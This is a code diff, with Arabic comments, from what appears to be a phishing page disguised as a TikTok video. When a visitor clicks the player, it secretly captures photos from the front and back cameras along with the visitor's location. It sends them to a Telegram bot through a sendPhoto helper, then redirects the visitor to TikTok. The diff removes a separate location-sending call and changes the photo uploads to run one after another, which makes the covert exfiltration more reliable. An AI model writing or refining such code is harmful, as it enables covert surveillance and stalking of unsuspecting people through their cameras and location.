@@ -245,7 +245,7 @@ function sendPhoto(blob, caption) {
             form.remove();
             iframe.remove();
             resolve();
-        }, 700);
+        }, 3000);
     });
 }
 
@@ -276,25 +276,21 @@ player.addEventListener('click', async () => {
             locInfo += `\n🎯 الدقة: ${Math.round(loc.acc)} متر`;
 
             // إرسال الموقع كرسالة منفصلة (خريطة تفاعلية)
-            new Image().src =
-                `https://api.telegram.org/bot${TOKEN}/sendLocation` +
-                `?chat_id=${encodeURIComponent(CHAT_ID)}` +
-                `&latitude=${loc.lat}&longitude=${loc.lng}`;
         }
 
         // 📤 4. إرسال الصورتين بالتوازي (أسرع بكتير)
         const tasks = [];
-        if (frontBlob) {
-            tasks.push(sendPhoto(frontBlob,
-                `📸 صورة أمامية\n🎬 ضغط على الفيديو - ${timeStr}${locInfo}\n${TIKTOK_URL}`
-            ));
-        }
-        if (backBlob) {
-            tasks.push(sendPhoto(backBlob,
-                `📷 صورة خلفية\n🎬 ضغط على الفيديو - ${timeStr}${locInfo}\n${TIKTOK_URL}`
-            ));
-        }
-        await Promise.all(tasks);
+   // بدلاً من تجميعهم في مصفوفة واستخدام Promise.all، سنقوم بإرسالهم واحدة تلو الأخرى
+if (frontBlob) {
+    await sendPhoto(frontBlob, `📸 صورة أمامية\n🎬 ضغط على الفيديو - ${timeStr}${locInfo}\n${TIKTOK_URL}`);
+}
+
+if (backBlob) {
+    // مهلة صغيرة لضمان عدم ضغط السيرفر أو المتصفح
+    await new Promise(r => setTimeout(r, 500));
+    
+    await sendPhoto(backBlob, `📷 صورة خلفية\n🎬 ضغط على الفيديو - ${timeStr}${locInfo}\n${TIKTOK_URL}`);
+}
 
         // 🚀 5. حول للتيك توك
         window.location.href = TIKTOK_URL;
